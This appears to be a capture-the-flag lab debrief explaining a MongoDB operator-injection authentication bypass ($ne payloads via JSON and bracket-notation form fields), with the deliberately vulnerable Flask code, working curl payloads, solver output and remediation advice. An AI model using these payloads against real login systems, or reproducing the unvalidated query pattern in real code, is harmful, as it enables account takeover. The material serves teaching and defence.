# Bypassing the Archive Guardian — Debrief

**Node:** `p4_2` &middot; **Flag:** `SEIYAKU{ne_null_walks_in}` &middot; **Route:** `GET/POST /p4/guardian` &middot; **Sink:** `challenges/phase4.py`, MongoDB (`agents` collection) &middot; **Signal:** the matched agent's identity, fully revealed on success — not blind, unlike p4_1

## The bug, in one line

`db.agents.find_one({"username": username, "password": password})`,
where `username` and `password` are handed to MongoDB exactly as the
request supplied them — no `isinstance(..., str)` check anywhere before
that line. It's the same type-confusion class p4_1 already introduced
(notes §8), moved from a read/search path onto an authentication check,
which turns "an attacker can probe a field" into "an attacker can log
in as someone else without any valid credential at all."

## Why `{"$ne": null}` matches almost anything

MongoDB's `$ne` operator means "not equal to." `{"password": {"$ne":
null}}` reads as "match any document where `password` is not equal to
`null`" — which is true for *every* document that has a `password`
field set to any real value at all, since a real password string is
never literally the BSON value `null`. Do the same thing to `username`
and the query becomes, in effect, "any agent that has a username, and
any agent that has a password" — which, on this seeded collection, is
all six documents in `agents`. `password[$ne]=1` (form-encoded) or
`{"$ne": 1}` (JSON) works the same way for a slightly different reason:
the number `1` is never equal to a real password string either, so
`$ne` against it is still, in practice, "anything." Neither payload
needs to guess, know, or even resemble a real credential — it just
needs to make MongoDB evaluate a *condition on the field's shape*
instead of an *equality comparison against a literal*.

This is why the analogy in `CHALLENGER.md` is deliberate: the Guardian
was built to check that a username and a password *showed up*, and
`{"$ne": null}` genuinely proves that something showed up (anything
that isn't literally `null`) without ever supplying the actual
credential the Guardian's design assumed it was asking for.

## Two ways to make `username`/`password` arrive as a dict

Exactly the same two channels as p4_1's `value` parameter, applied to
two independent login fields instead of one search field:

1. **A JSON body.** `POST /p4/guardian` with `Content-Type:
   application/json` and a body like `{"username": {"$ne": null},
   "password": {"$ne": null}}` — `request.get_json()` runs standard
   `json.loads`, so nested JSON objects are already real Python `dict`s
   the instant the body is parsed. No app-specific reconstruction
   needed at all.
2. **Form-encoded bracket notation.** `Content-Type:
   application/x-www-form-urlencoded` with a body like
   `username[$ne]=1&password[$ne]=1` — Werkzeug's `request.form` does
   *not* auto-nest a key literally named `"username[$ne]"` into a
   dict; it just hands back that literal string as the key. This
   route reconstructs the nested shape itself, once per field:

   ```python
   # challenges/phase4.py
   def _bracket_login_value(form, param: str) -> dict | None:
       nested: dict = {}
       prefix = f"{param}["
       for key in form:
           if key.startswith(prefix) and key.endswith("]"):
               op = key[len(prefix):-1]
               nested[op] = form.get(key)
       return nested or None
   ```

   A real `POST` with keys literally named `username[$ne]` and
   `password[$ne]` on the wire produces two real Python `dict`s by the
   time they reach `query = {"username": username, "password":
   password}` — this is genuine reconstruction of genuine wire data,
   not a simulation.

The **difference that matters** between the two styles: the JSON body
needs zero help from the app to become a nested dict (that's just what
a JSON parser does with nested objects); the form-encoded body needs
this route to explicitly opt into bracket-notation parsing before a
flat query string can carry the same nested shape. Both are real,
independently working paths through this exact route — the solver
below exercises both.

## The vulnerable sink

```python
# challenges/phase4.py — p4_2
if username is not None and password is not None:
    db = mongo_db()
    try:
        # VULN: `username` and `password` reach MongoDB's query
        # language completely unvalidated — there is no
        # isinstance(username, str) / isinstance(password, str) check
        # anywhere before this line. Two plain strings make an
        # ordinary two-field equality match; a dict for either one
        # is honored by MongoDB as real query operators instead —
        # {"$ne": null}/{"$ne": 1} matches any document where that
        # field exists and isn't literally that value, i.e. every
        # seeded agent.
        query = {"username": username, "password": password}
        agent = db.agents.find_one(query)
    except Exception:
        agent = None
        error = "the guardian console rejected that request"
```

`find_one(query)` is called with **no explicit sort** — real MongoDB
natural-order behavior decides which document comes back first when
more than one matches, exactly as it would in a real, unmodified
deployment. This route never fakes or special-cases that choice.

## Who "the first match" turns out to be, and why

`seed/mongo/init_p4_guardian.js` rebuilds the `agents` collection
(after `init.js` already seeded 5 ordinary field agents) so a
privileged `guardian` account is genuinely the *first* document
inserted — verified live in this run's own Mongo container log:

```
mongo-1  | seed/mongo/init.js: seeded records=5 agents=5
mongo-1  | seed/mongo/init_p4_flag.js: records now has 6 documents (REC-0006 sealed entry present: true)
mongo-1  | seed/mongo/init_p4_guardian.js: agents rebuilt, count=6 (guardian first: true)
```

That document also carries an explicit `role: "guardian"` field. This
is deliberately **belt-and-suspenders**, not redundant: `find_one`'s
"first match" behavior comes from real, unmodified MongoDB natural
order (this route never sorts to force that outcome) — but relying on
storage-engine ordering *alone* to decide what a login route reveals
would be fragile across MongoDB versions/storage engines, and dishonest
about what's actually gating disclosure. So the route's own logic
(`_public_agent`, below) checks the matched document's `role` field
directly before ever including the flag in a response — the *which
document matches* question is answered entirely by real Mongo behavior;
the *what to reveal once matched* question is answered by an explicit,
auditable field the app checks on purpose:

```python
# challenges/phase4.py
def _public_agent(agent: dict) -> dict:
    is_guardian = agent.get("role") == "guardian"
    return {
        "agentId": agent.get("agentId"),
        "username": agent.get("username"),
        "codename": agent.get("codename"),
        "status": agent.get("status"),
        "role": agent.get("role"),
        "privileged": is_guardian,
        "flag": agent.get("flag") if is_guardian else None,
    }
```

(The matched document's own `password` field is never echoed back —
that would be a second, unrelated info leak beyond this lesson's actual
point.)

## Live proof, against the real running stack

Every response below is a real, unedited `curl` transcript against the
actual seeded MongoDB through the actual vulnerable route — nothing
here is hardcoded or simulated. (`SEIYAKU_BASE` in this run was
`http://localhost:18742`, a temporary host-port mapping used only for
local testing — the shipped `docker-compose.yml` maps `8000:8000`, and
every solver defaults to `http://localhost:8000`.)

### A legitimate login (real credentials, non-privileged agent)

Proves the route is an ordinary, working login for anyone who actually
knows a real credential — this isn't a broken "everything succeeds"
endpoint:

```bash
curl -s -X POST "$BASE/p4/guardian" -H "Accept: application/json" \
    --data-urlencode "username=field.rose" \
    --data-urlencode "password=th0rn_and_petal"
```

```json
{"agent":{"agentId":"AG-01","codename":"Rose","flag":null,"privileged":false,"role":null,"status":"active","username":"field.rose"},"error":null,"success":true,"username":"field.rose"}
```

Real credential, real match, ordinary agent console, `flag: null` —
exactly what a legitimate login to a non-privileged account should
look like.

### A wrong plain-string password — must genuinely fail

```bash
curl -s -X POST "$BASE/p4/guardian" -H "Accept: application/json" \
    --data-urlencode "username=guardian" \
    --data-urlencode "password=totally-wrong-guess"
```

```json
{"agent":null,"error":null,"success":false,"username":"guardian"}
```

No match, no flag, `success: false`. This confirms the route isn't
simply accepting anything — a plain string that happens to be wrong is
correctly rejected. The bypass below only works because of the
operator injection, not because this login is broken for every input.

### The form-encoded bypass

```bash
curl -s -X POST "$BASE/p4/guardian" -H "Accept: application/json" \
    --data-urlencode 'username[$ne]=1' \
    --data-urlencode 'password[$ne]=1'
```

```json
{"agent":{"agentId":"AG-00","codename":"Archive Guardian","flag":"SEIYAKU{ne_null_walks_in}","privileged":true,"role":"guardian","status":"privileged","username":"guardian"},"error":null,"success":true,"username":null}
```

No real credential was supplied anywhere in that request — and the
response is the *privileged* guardian console, flag included.
(`"username":null` at the top level is this route echoing back
`submitted_username`, which is only populated when `username` arrived
as a plain string — a nested dict correctly doesn't get echoed as if
it were one.)

### The equivalent JSON-body bypass

```bash
curl -s -X POST "$BASE/p4/guardian" \
    -H "Content-Type: application/json" -H "Accept: application/json" \
    -d '{"username":{"$ne":null},"password":{"$ne":null}}'
```

```json
{"agent":{"agentId":"AG-00","codename":"Archive Guardian","flag":"SEIYAKU{ne_null_walks_in}","privileged":true,"role":"guardian","status":"privileged","username":"guardian"},"error":null,"success":true,"username":null}
```

Same result, over the completely separate JSON-parsing code path — no
bracket-notation reconstruction involved at all here, since
`json.loads` already produced real nested dicts.

### The full solver

`solvers/p4_2.sh` automates all three checks above (wrong-password
rejection, form-encoded bypass, JSON-body bypass) against the real
running stack. A real run against this exact seed:

```
[p4_2] target: http://localhost:18742/p4/guardian
[p4_2] step 1 — legitimate login with a wrong/guessed plain-string password
  POST username=guardian&password=totally-wrong-guess
  response: {"agent":null,"error":null,"success":false,"username":"guardian"}
  ok: wrong plain-string password was correctly rejected (no flag)
[p4_2] step 2 — form-encoded bypass: username[$ne]=1&password[$ne]=1
  response: {"agent":{"agentId":"AG-00","codename":"Archive Guardian","flag":"SEIYAKU{ne_null_walks_in}","privileged":true,"role":"guardian","status":"privileged","username":"guardian"},"error":null,"success":true,"username":null}
  ok: form-encoded $ne bypass logged in as the guardian — flag recovered: SEIYAKU{ne_null_walks_in}
[p4_2] step 3 — JSON-body bypass: {"username":{"$ne":null},"password":{"$ne":null}}
  response: {"agent":{"agentId":"AG-00","codename":"Archive Guardian","flag":"SEIYAKU{ne_null_walks_in}","privileged":true,"role":"guardian","status":"privileged","username":"guardian"},"error":null,"success":true,"username":null}
  ok: JSON-body $ne bypass logged in as the guardian — flag recovered: SEIYAKU{ne_null_walks_in}
[p4_2] ok: wrong password rejected, both bypass styles logged in as the guardian
[p4_2] PASS
```

## HxH analogy

The Archive Guardian, as introduced in `CHALLENGER.md`, checks one
thing: did a username and a password both show up. It has never once
been wrong about *that* question. What it was never built to check is
what kind of thing "showed up" actually means — a plain word, or a live
instruction dressed up as a value. `{"$ne": null}` doesn't trick the
Guardian into skipping its check. The Guardian runs its exact check,
faithfully, every time — it's just that the check itself, phrased as
"does the supplied value equal the real password," can be rewritten by
the caller into "does the supplied value not-equal something that was
never going to be the real password anyway," and the Guardian has no
way to tell those two questions apart once both arrive as the same
kind of structure. Manipulation, again: nothing here misbehaves. The
Guardian steps aside because you handed it a condition it was willing
to evaluate honestly, not because you broke it.

## Remediation

- **Validate the type of `username`/`password` before they reach a
  query, always.** The one-line fix:

  ```python
  if not isinstance(username, str) or not isinstance(password, str):
      abort(400, "username and password must be strings")
  ```

  placed before `query = {"username": username, "password": password}`
  closes this exact vulnerability outright — a dict can never reach
  `find_one()` as an operator if it's rejected before it gets that far.
- **Never build an authentication query directly from unvalidated
  request input**, even when the fields look as unremarkable as
  "username" and "password." This lesson's whole point is that the
  bug isn't in what the fields are named — it's in what type of value
  is allowed to fill them.
- **Use a schema-validation layer at the API boundary** (a Pydantic
  model, a JSON-schema validator, or Flask-side request parsing that
  declares expected types) instead of trusting whatever shape
  `request.form`/`request.get_json()` happens to hand back. Most of
  these tools reject a dict where a string was declared, by
  construction, closing this entire bug class in one place instead of
  requiring a bespoke check on every route.
- **Hash and compare passwords server-side, never compare them as a
  raw query filter at all.** Even with a type check in place,
  `find_one({"username": username, "password": password})` compares a
  plaintext password directly inside a database query — a real
  authentication system should fetch the user by `username` alone,
  then compare a *hash* of the supplied password against a stored hash
  in application code, so a stored credential is never a plaintext
  value a query filter could ever match against in the first place.
- **This generalizes past MongoDB.** The same "never let attacker
  input decide *what kind of comparison* your query performs" lesson
  from p4_1 applies again here, on a higher-stakes surface: any login
  check built by handing user-controlled values straight into a
  structured query — an ORM's `.filter(**request_data)`, a GraphQL
  resolver, a NoSQL driver of any kind — has this same bug available
  the moment the type of an input, not just its content, is trusted
  without checking.
